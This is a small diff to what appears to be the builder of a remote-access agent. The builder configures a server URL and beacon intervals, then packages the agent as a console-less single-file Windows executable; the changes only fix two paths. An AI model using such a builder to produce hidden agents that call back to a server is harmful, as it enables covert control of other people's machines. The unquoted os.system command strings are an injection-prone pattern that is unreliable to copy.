@@ -18,6 +18,8 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     if os.path.exists(working_dir):
         shutil.rmtree(working_dir)
     agent_dir = os.path.dirname(__file__)
+    if agent_dir == "":
+        agent_dir = os.path.dirname(os.path.realpath(__file__))
     shutil.copytree(agent_dir, working_dir)
     with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
         with open(os.path.join(agent_dir, "template_config.py")) as f:
@@ -38,7 +40,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         if os.name == 'posix': 
             os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
         else:
-            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            os.system('C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
         if not prog_name.endswith(".exe"):
             prog_name += ".exe"
         agent_file = os.path.join(working_dir, 'dist', prog_name)
